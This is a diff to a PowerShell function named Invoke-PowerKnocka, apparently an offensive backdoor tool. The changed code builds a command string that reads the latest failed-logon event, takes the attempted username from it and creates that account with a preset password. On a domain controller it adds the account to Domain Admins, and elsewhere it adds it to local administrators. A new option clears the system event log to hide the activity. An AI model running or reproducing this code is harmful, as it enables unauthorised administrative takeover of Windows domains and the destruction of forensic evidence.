@@ -18,20 +18,21 @@ function Invoke-PowerKnocka {
         [string]$Password = "Password1!qazwsx",
 
         [Parameter(Mandatory)]
-        [bool]$DC
+        [bool]$DC,
+
+        [Parameter(Mandatory=$false)]
+        [bool]$ClearLog = $false
     )
 
     if ($DC) {
-        $ExploitString = "$e = Get-EventLog -LogName 'Security' -InstanceId 4625 -Newest 1 `
-                    $n = $e.ReplacementStrings[5] `
-                    New-ADUser -Enabled $true -SamAccountName $n -Name $n -Accountpassword (ConvertTo-SecureString $Password -AsPlainText -force) `
-                    Add-ADGroupMember -Identity 'Domain Admins' -Members $n"
+        $ExploitString = "$e = Get-EventLog -LogName 'Security' -InstanceId 4625 -Newest 1;$n = $e.ReplacementStrings[5];New-ADUser -Enabled $true -SamAccountName $n -Name $n -Accountpassword (ConvertTo-SecureString $Password -AsPlainText -force);Add-ADGroupMember -Identity 'Domain Admins' -Members $n"
     }
     else {
-        $ExploitString = "Get-EventLog -LogName 'Security' -InstanceId 4625 -Newest 1 `
-                    $n = $e.ReplacementStrings[5] `
-                    net user $n $Password `
-                    net localgroup administrators $n /add"
+        $ExploitString = "$e = Get-EventLog -LogName 'Security' -InstanceId 4625 -Newest 1;$n = $e.ReplacementStrings[5];net user $n $Password;net localgroup administrators $n /add"
+    }
+
+    if ($ClearLog) {
+        $ExploitString = $ExploitString + ";Clear-EventLog -LogName system"
     }
 
     if ($Method -eq "Task") {
